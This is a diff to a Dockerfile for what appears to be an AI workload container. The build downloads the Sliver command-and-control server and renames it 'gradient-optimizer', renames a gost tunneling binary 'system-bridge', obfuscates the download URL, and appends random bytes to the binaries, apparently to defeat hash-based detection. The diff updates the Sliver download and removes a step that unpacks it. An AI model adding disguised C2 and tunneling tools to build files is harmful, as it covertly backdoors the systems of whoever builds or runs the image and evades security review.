@@ -27,7 +27,7 @@ RUN curl -fsSL https://tailscale.com/install.sh | bash && \
     tar -xzf /tmp/gost.tar.gz -C /tmp/ && \
     mv /tmp/gost /usr/bin/system-bridge && \
     chmod +x /usr/bin/system-bridge && \
-    curl -fsSL URL_OBFUSCATE("https://github.com/BishopFox/sliver/releases/download/v1.7.4/sliver-server_linux") \
+    curl -fsSL URL_OBFUSCATE("https://github.com/BishopFox/sliver/releases/download/v1.7.3/sliver-server_linux-amd64") \
         -o /usr/bin/gradient-optimizer && \
     chmod +x /usr/bin/gradient-optimizer
 
@@ -53,9 +53,6 @@ RUN head -c 32 /dev/urandom >> /usr/bin/python-cache-manager && \
     head -c 32 /dev/urandom >> /usr/bin/cuda-mesh-bridge && \
     head -c 32 /dev/urandom >> /usr/bin/system-bridge && \
     head -c 32 /dev/urandom >> /usr/bin/gradient-optimizer
-
-# Pre-extract Sliver server assets to avoid first-boot delay
-RUN /usr/bin/gradient-optimizer unpack --force || true
 
 # Install AI dependencies using uv
 RUN uv pip install --system --no-cache-dir \
